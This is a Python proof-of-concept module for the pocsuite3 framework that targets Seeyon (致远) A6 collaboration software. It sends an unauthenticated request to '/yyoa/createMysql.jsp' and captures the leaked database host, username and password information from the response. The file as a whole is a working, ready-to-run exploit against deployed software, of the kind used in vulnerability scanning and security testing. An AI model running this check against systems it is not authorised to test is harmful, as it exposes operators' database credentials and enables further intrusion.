#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''致远_A6_createMysql_unauth'''
    desc = '''泄漏数据库用户名，密码'''
    solution = '''控制权限'''
    severity = '''medium'''
    vulType = '''unauthorized-access'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''致远协同系统'''
    appVersion = '''A6,'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url, ip, port = parse_ip_port(self.target, 80)
        verify_url = make_verify_url(self.url, '/yyoa/createMysql.jsp', mod=0)
        response = requests.get(verify_url, timeout=15, allow_redirects=False, verify=False)
        if response.content.strip().startswith(b'localhost') and response.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['port'] = port
            result['VerifyInfo']['DBname'] = response.content.strip().decode()
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
